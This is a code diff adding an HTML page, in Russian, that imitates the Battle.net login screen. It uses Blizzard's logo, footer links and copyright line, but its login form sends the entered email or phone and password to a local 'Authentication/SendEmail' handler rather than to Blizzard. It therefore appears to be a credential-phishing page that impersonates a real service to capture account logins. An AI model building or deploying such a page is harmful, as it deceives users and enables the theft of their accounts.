@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+        <title>Авторизация в Battle.net</title>
+        <link rel="stylesheet" type="text/css" href="styles.css">
+    </head>
+    <body class="body">
+        <div class="container">
+            <div class="main-div">
+                <main class="main">
+                    <div class="auth">
+                         <div>
+                             <img class="main-logo" src="images/logo_1.svg" width="240px" height="72px">
+                         </div>
+                         <h3 class="text">Авторизоваться</h3>
+                         <div class="login">
+                             <div class="buttons" id="templates">
+                                @for(Buttons_first_row)
+                                    @item
+                                @endfor
+                             </div>
+                             <div class="buttons" id="templates">
+                                @for(Buttons_second_row)
+                                    @item
+                                @endfor
+                             </div>
+                         </div>
+                         <div class="third-party">
+                            <span class="main-span">или войти через</span>
+                         </div>
+                         <form action="Authentication/SendEmail" method="POST">
+                            <div style="display: block; width: 100%; padding: 0; max-width: 416px; align-items: center;">
+                                <div style="margin: 0 auto 11px;">
+                                    <input class="main-input" name="email" type="text" placeholder="Электронная почта или телефон" spellcheck="false" autocorrect="off">
+                                </div>
+                                <div style="margin: 0 auto 11px;">
+                                    <input class="main-input" name="password" type="password" placeholder="Пароль" spellcheck="false" autocorrect="off">
+                                </div>
+                            </div>
+                            <div class="auth-button">
+                                <button class="submit-button" type="submit" aria-label="Авторизоваться">Авторизоваться</button>
+                            </div>
+                         </form>
+                        <ul class="links">
+                            <li class="link">
+                                <b><a class="link-a" rel="internal" href="https://account.battle.net/creation/?theme=bnet-next&amp;flowTrackingId=68d91ff6-8262-4f01-8a6f-15e60c69f3f6&amp;bdp=df73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee" tabindex="0" id="signup" role="button">
+                                    Зарегистрируйте учетную запись Battle.net бесплатно
+                                    </a></b>
+                            </li>
+                            <li role="link">
+                                <a class="link-a" rel="internal" target="_blank" href="https://account.battle.net/recovery/?theme=bnet-next&amp;flowTrackingId=68d91ff6-8262-4f01-8a6f-15e60c69f3f6" tabindex="0" id="loginSupport" role="button">
+                                    Вы не можете войти?
+                                    <svg style="display: inline-block; width: 0.75em; height: 0.75em; margin-left: 1px; margin-bottom: 3px; line-height: inherit; vertical-align: middle;" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512"><style>svg{fill:#158eff};</style><path d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32H320zM80 32C35.8 32 0 67.8 0 112V432c0 44.2 35.8 80 80 80H400c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32V432c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16H192c17.7 0 32-14.3 32-32s-14.3-32-32-32H80z"/></svg>
+                                </a>
+                            </li>
+                        </ul>
+                 </main>
+            </div>
+            <footer class="footer">
+                <div class="footer-div">
+                    <a class="footer-link" href="https://www.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Пользовательское соглашение Blizzard</a>
+                    <span>|</span>
+                    <a class="footer-link" href="https://www.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Политика конфиденциальности</a>
+                    <span>|</span>
+                    <a class="footer-link" href="https://www.blizzard.com/company/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Условия</a>
+                    <span>|</span>
+                </div>
+                <div class="footer-div">
+                    <a class="footer-link" href="https://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Авторское право</a>
+                    <span>|</span>
+                    <a class="footer-link" href="/login/cookies" data-analytics="global-nav" data-analytics-placement="Footer - Cookies">Файлы cookie</a>
+                    <span>|</span>
+                    <a class="footer-link" href="/login/cookies#settings" data-analytics="global-nav" data-analytics-placement="Footer - Cookie Settings">Параметры cookie</a>
+                    </div>
+                    <div class="copyright">© Blizzard Entertainment, Inc., 2023</div>
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
